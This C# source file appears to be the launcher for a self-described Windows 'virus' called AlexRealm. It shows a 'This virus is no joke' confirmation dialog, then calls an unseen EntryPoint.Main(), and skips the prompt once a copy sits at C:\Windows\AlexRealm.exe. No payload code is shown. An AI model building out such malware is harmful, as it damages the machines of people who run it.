using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using Microsoft.Win32;
using System.Diagnostics;

namespace AlexRealm
{
    public class Main_Class
    {
        public static void Main()
        {
            if (!File.Exists(@"C:\Windows\AlexRealm.exe"))
            {
                if (MessageBox.Show("This virus is no joke, still execute it?", "AlexRealm.exe", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                {
                    EntryPoint.Main();
                }
                else
                {
                    Environment.Exit(0);
                }
            }
            else
            {
                EntryPoint.Main();
            }
        }
    }
}